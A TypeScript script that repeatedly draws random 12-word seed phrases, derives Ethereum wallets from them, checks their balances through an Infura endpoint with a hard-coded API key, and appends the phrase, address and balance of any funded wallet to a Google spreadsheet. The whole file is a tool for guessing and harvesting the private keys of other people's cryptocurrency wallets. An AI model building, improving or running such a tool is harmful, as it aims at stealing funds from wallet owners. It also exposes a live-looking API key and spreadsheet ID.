import fs from 'fs';
import { Wallet, JsonRpcProvider, formatUnits } from 'ethers';
import { google } from 'googleapis';


// Replace with your custom RPC provider URL (e.g., from Alchemy, Infura, QuickNode)
const providerUrl = 'https://mainnet.infura.io/v3/c9fdd665397741fd8a7de1a8925687fc'; // Insert your Infura URL here

// Load the word list from the JSON file
const loadWordList = (filePath: string): string[] => {
  try {
      const data = fs.readFileSync(filePath, 'utf-8');
      return JSON.parse(data);
  } catch (error) {
      console.error(`Error loading word list from ${filePath}`);
      return []; // Return empty array if there's an error
  }
};

// Shuffle the array and extract a given number of items
const getRandomWords = (words: string[], count: number): string[] => {
  const shuffled = words.sort(() => 0.5 - Math.random());
  return shuffled.slice(0, count);
};

// Convert the array to a space-separated string
const formatWordList = (words: string[]): string => {
  return words.join(' ');
};

async function getInfoWallet(auth:any, mnemonic: string) {
  try {
    // Derive the wallet directly from the mnemonic
    const wallet = Wallet.fromPhrase(mnemonic);

    // Connect to the specified RPC provider
    const provider = new JsonRpcProvider(providerUrl);

    // Fetch the wallet's balance in ETH
    const balance = await provider.getBalance(wallet.address);

    // Convert the balance from Wei to Ether
    const balanceInEth = formatUnits(balance, 'ether');
    console.log("balance:", balanceInEth);
    if(parseFloat(balanceInEth)*1000>0){
      const walletAddress = wallet.address;
      await writeToSheet(auth, mnemonic, walletAddress, balanceInEth)
    }
  } catch (error) {
    console.error('Error retrieving wallet details');
  }
}

// Authenticate using Service Account JSON key
async function authenticate() {
  try {
      const auth = new google.auth.GoogleAuth({
          keyFile: './service_account.json', // Path to your service account JSON key file
          scopes: ['https://www.googleapis.com/auth/spreadsheets'],
      });
      return await auth.getClient();
  } catch (error) {
      console.error("Error authenticating Google Sheets API");
      throw error; // Re-throw error to allow handling in the calling function
  }
}

// Write to Google Sheets
async function writeToSheet(auth: any, mnemonic: string, walletAddress: string, balanceInEth: string) {
  try {
      const sheets = google.sheets({ version: 'v4', auth });
      const spreadsheetId = '1kp1VAy-Rh5r3lPWdlRfDtIlRz5UV1iIpYHYz6-2SGs4'; // Your spreadsheet ID
      const range = 'Sheet1!A1'; // Adjust this range based on where you want to write the data

      const request = {
          spreadsheetId,
          range,
          valueInputOption: 'RAW',
          requestBody: {
              values: [['111', mnemonic, walletAddress, balanceInEth]],
          },
      };

      await sheets.spreadsheets.values.append(request);
      console.log(`Successfully wrote to Google Sheets for wallet ${walletAddress}`);
  } catch (error) {
      console.error("Error writing to Google Sheets");
  }
}

// Main function
async function main() {
  const wordList = loadWordList('wordList.json');
  let i = 0;
  while (true) {
      try {
          const randomWords = getRandomWords(wordList, 12);
          const result = formatWordList(randomWords);
          console.log("---------------------", i, "---------------------\n", result);
          i = i + 1;
          
          const auth = await authenticate();
          await getInfoWallet(auth, result);
      } catch (error) {
          console.error("An error occurred in the main loop");
          // Add a delay before retrying to avoid rapid error loops
          await new Promise(resolve => setTimeout(resolve, 5000));
      }

      // Ensure the loop cycle is approximately 1 second
      await new Promise(resolve => setTimeout(resolve, 2000));
  }
};

main().catch(console.error);